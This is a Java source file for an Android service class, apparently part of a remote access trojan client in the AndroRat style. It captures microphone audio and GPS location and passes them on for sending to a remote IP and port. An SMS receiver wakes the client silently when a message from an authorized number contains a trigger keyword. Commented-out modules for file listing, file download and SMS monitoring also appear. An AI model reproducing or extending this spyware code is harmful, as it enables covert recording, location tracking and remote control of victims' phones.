package Cliente;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.media.AudioRecord;
import android.media.AudioRecord.OnRecordPositionUpdateListener;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.util.ArrayList;

import Libreria.AdvancedSystemInfo;
import Libreria.Audio;
import Libreria.GPSListener;
import Libreria.SystemInfo;

/**
 * Created by Vero on 19/05/2015.
 */
public abstract class ClientListener extends Service implements OnRecordPositionUpdateListener,LocationListener {

    public abstract void handleData(int channel, byte[] data); //
    public abstract void sendInformation(String infos);
    public abstract void sendError(String error);
    public abstract void loadPreferences();

    public Audio audioStreamer;
    public GPSListener gps;
//  public DirLister dirLister ;
//  public FileDownloader fileDownloader;
    public SystemInfo infos;
    public Toast toast ;
//    public SMSMonitor smsMonitor ;
    public AdvancedSystemInfo advancedInfos;
    boolean waitTrigger;
    ArrayList<String> authorizedNumbersCall;
    ArrayList<String> authorizedNumbersSMS;
    ArrayList<String> authorizedNumbersKeywords;
    String ip;
    int port;

    protected boolean isConnected = true;



    public ClientListener() {
        super();
    }
    @Override
    public void onMarkerReached(AudioRecord recorder) {

    }

    @Override
    public void onPeriodicNotification(AudioRecord recorder) {

        try {
            byte[] data = audioStreamer.getData();
            if(data != null)
                handleData(audioStreamer.getChannel(), data);
        }
        catch(NullPointerException e) {

        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    protected BroadcastReceiver SMSReceiver = new BroadcastReceiver() {

        private final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

        @Override
        public void onReceive(Context context, Intent intent) {
            if(intent.getAction().equals(SMS_RECEIVED)) { //On vérifie que c'est bien un event de SMS_RECEIVED même si c'est obligatoirement le cas.
                Log.i("SMSReceived", "onReceive sms !");

                Bundle bundle = intent.getExtras();
                if (bundle != null) {
                    Object[] pdus = (Object[]) bundle.get("pdus");

                    final SmsMessage[] messages = new SmsMessage[pdus.length];
                    for (int i = 0; i < pdus.length; i++)  {
                        messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    }
                    if (messages.length > -1) {

                        final String messageBody = messages[0].getMessageBody();
                        final String phoneNumber = messages[0].getDisplayOriginatingAddress();

                        if(authorizedNumbersCall != null) {
                            boolean found = false;
                            boolean foundk = false;
                            for(String s: authorizedNumbersSMS) {
                                if(s.equals(phoneNumber))
                                    found = true;
                            }
                            if(!found)
                                return;
                            if(authorizedNumbersKeywords != null) {
                                for(String s: authorizedNumbersKeywords) {
                                    if(messageBody.contains(s))
                                        foundk = true;
                                }
                                if(!foundk)
                                    return;
                            }
                            Log.i("Client","Incoming call authorized");
                        }

                        Intent serviceIntent = new Intent(context, Cliente.class); // On lance le service
                        serviceIntent.setAction("SMSReceiver");
                        context.startService(serviceIntent);
                    }
                }
            }

        }
    };
    public void onLocationChanged(Location location) {
        byte[] data = gps.encode(location);
        handleData(gps.getChannel(), data);
    }

    public void onProviderDisabled(String provider) {
        sendError("GPS desactivated");
    }

    public void onProviderEnabled(String provider) {
        sendInformation("GPS Activated");
    }
}
